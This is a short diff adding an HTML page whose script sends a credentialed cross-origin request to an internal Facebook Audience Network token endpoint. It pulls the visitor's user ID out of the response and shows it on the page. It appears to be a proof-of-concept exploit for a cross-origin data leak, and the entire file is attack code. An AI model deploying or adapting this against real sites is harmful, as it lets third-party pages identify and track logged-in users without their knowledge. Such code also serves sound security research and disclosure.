@@ -1,0 +1,19 @@
+<html>
+  <head>
+  </head>
+  <body>
+    <script>
+fetch('https://www.intern.facebook.com/audiencenetwork/token/update/?partner=665790704&vr_token=a', {credentials: 'include'})
+  .then(
+    function(response) {
+      response.text().then(function(body){
+        var uid = body.match(/\(user: ([0-9]+) /);
+        if (uid !== null && uid.length === 2) {
+          document.getElementById('uid').innerHTML = uid[1];
+        }
+      });
+    }
+  );
+    </script>
+  </body>
+</html>
